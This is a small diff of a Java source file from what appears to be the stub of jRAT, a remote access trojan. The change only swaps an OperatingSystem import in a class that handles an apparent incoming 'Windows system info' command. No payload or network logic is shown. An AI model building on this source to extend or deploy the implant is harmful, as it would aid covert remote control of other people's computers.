@@ -3,9 +3,10 @@ package se.jrat.stub.packets.incoming;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
-import se.jrat.common.OperatingSystem;
 import se.jrat.stub.Connection;
 import se.jrat.stub.packets.outgoing.Packet57RawComputerInfo;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet83WinSysInfo extends AbstractIncomingPacket {
